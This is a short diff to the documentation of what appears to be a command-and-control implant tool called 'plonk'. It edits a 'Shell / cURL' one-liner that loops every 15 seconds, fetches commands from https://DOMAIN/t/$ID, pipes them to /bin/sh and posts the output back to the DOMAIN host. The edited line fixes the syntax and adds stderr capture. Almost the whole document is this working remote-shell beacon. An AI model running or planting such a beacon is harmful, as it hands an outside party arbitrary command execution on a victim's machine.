@@ -7,7 +7,7 @@ IMPLANTID.  There's 15 seconds between callbacks.
 Shell / cURL
 ------------
 ```bash
-ID="$RANDOM" while :; do curl -s "https://DOMAIN/t/$ID" | /bin/sh | curl --data-binary @- -s "https://DOMAIN/o/$ID"; sleep 15; done
+ID="$RANDOM"; P="DOMAIN"; while :; do curl -s "https://$P/t/$ID" | /bin/sh 2>&1 | curl --data-binary @- -s "https://$P/o/$ID"; sleep 15; done
 ```
 
 This is particularly noisy with `plonk -verbose`.
